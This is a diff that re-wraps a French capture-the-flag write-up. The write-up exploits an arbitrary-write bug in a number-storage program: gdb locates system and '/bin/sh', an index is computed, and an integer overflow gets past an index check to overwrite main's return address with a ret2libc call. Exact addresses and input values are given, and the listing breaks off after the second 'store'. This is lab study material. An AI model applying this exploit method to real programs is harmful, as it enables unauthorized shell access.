@@ -1,6 +1,7 @@
-On décompile le programme, et on voit un programme de mauvais stockage de nombre. On voit que la fonction pour
-stocker les nombres permet d'écrire n'importe où en mémoire. On décide donc d'écrire un appel à system à la place
-de l'adresse de retour de main, suivi d'une adresse vers "/bin/sh" avec 4 octets de padding. 
+On décompile le programme, et on voit un programme de mauvais stockage de nombre. 
+On voit que la fonction pour stocker les nombres permet d'écrire n'importe où en 
+mémoire. On décide donc d'écrire un appel à system à la place de l'adresse de 
+retour de main, suivi d'une adresse vers "/bin/sh" avec 4 octets de padding. 
 
 On trouve l'adresse de /bin/sh
 (gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
@@ -15,18 +16,16 @@ Non-debugging symbols:
 0xf7e6aed0  system
 0xf7f48a50  svcerr_systemerr
 
-décomp, on voit que avec store, on peut écrire où on veut, on va changer adresse de retour dans la stack de main
-pour aller dans system, on réécrit aussi 4 octets plus loin l'adresse de "/bin/sh"
-
-Il faut trouver l'adresse d'array, et l'adresse de l'adresse de retour sur la stack
-en lisant asm, on trouve array à 0x08(%ebp) dans la fun store_number 
+Il faut trouver l'adresse d'array, et l'adresse de l'adresse de retour sur la 
+stack en lisant l'asm, on trouve array à 0x08(%ebp) dans la fun store_number 
 (gdb) x/x $ebp + 0x8
 0xffffd530:     0xffffd554
 
 Il faut maintenant trouver l'adresse de retour sur la stack. 
 
-La fonction appelante de la fonction main est la fonction start. On cherche l'adresse de cette fonction, pour 
-trouver quelque chose de similaire sur la stack. 
+La fonction appelante de la fonction main est la fonction start. On cherche 
+l'adresse de cette fonction, pour trouver quelque chose de similaire sur la 
+stack. 
 
 (gdb) info function start
 All functions matching regular expression "start":
@@ -41,7 +40,8 @@ Non-debugging symbols:
 0xf7f1d9c0  __monstartup
 0xf7f1d9c0  monstartup
 
-On sait que l'array est à l'addresse 0xffffd554, et fait 400 octets. On cherche donc l'adresse de retour vers
+On sait que l'array est à l'addresse 0xffffd554, et fait 400 octets. On cherche 
+donc l'adresse de retour vers
 0xffffd6e4
 (gdb) x/20x 0xffffd6e4
 0xffffd6e4:     0x00000001      0x00000000      0x00000000      0x00000000
@@ -50,20 +50,22 @@ On sait que l'array est à l'addresse 0xffffd554, et fait 400 octets. On cherche
 0xffffd714:     0x00000000      0x00000000      0xf7e45513      0x00000001
 0xffffd724:     0xffffd7b4      0xffffd7bc      0xf7fd3000      0x00000000
 
-On voit que la valeur à l'adresse 0xffffd71c ressemble à l'adresse de début de __libc_start_main; ça doit donc 
-être l'adresse de retour de main. 
+On voit que la valeur à l'adresse 0xffffd71c ressemble à l'adresse de début 
+de __libc_start_main; ça doit donc être l'adresse de retour de main. 
 
-On a donc l'adresse de début de l'array, et l'adresse de retour sur la stack. On fait la différence entre les 
-deux, et on divise par 4 pour obtenir l'index que l'on va devoir utiliser pour écrire à cet endroit avec la 
+On a donc l'adresse de début de l'array, et l'adresse de retour sur la stack. 
+On fait la différence entre les deux, et on divise par 4 pour obtenir l'index 
+que l'on va devoir utiliser pour écrire à cet endroit avec la 
 commande store du programme
 (0xffffd71c - 0xffffd554) / 4 = 0x72 = 114
-On doit donc écrire l'adresse de system à l'index 114, or c'est un multiple de 3, et le programme nous dit que 
-c'est réservé à Wil. Pour contourner ça, il suffit suffit de faire un overflow de la variable, avec uint_max. 
+On doit donc écrire l'adresse de system à l'index 114, or c'est un multiple de 3, 
+et le programme nous dit que c'est réservé à Wil. Pour contourner ça, il suffit 
+suffit de faire un overflow de la variable, avec uint_max. 
 On prend donc ceil(uint_max / 4 + 114) = 1073741938
 
 L'attaque sera donc comme suit
 store
-adresse de system (f7e6aed0 = 4159090384)
+adresse de system (0xf7e6aed0 = 4159090384)
 l'index overflowé (1073741938)
 
 store
